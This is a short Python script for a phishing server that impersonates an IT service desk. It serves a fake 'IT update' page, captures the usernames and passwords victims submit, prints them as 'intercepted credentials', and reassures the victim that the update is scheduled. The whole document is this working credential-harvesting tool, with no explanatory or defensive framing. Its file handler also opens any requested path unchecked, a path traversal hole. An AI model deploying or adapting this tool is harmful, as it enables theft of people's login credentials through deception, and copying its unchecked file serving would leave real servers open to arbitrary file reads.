from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == "/":
            self.path = "/it_update.html"

        try:
            file = open(self.path[1:], 'rb')
            self.send_response(200)
            self.end_headers()
            self.wfile.write(file.read())
            file.close()
        except:
            self.send_error(404)

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length)
        data = urllib.parse.parse_qs(post_data.decode())

        username = data.get('username', [''])[0]
        password = data.get('password', [''])[0]

        print("\n[+] INTERCEPTED CREDENTIALS")
        print(f"    Username: {username}")
        print(f"    Password: {password}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Update scheduled. You may close this window.")

server = HTTPServer(("0.0.0.0", 8080), Handler)
print("[*] Fake IT Service Desk running on port 8080")
server.serve_forever()
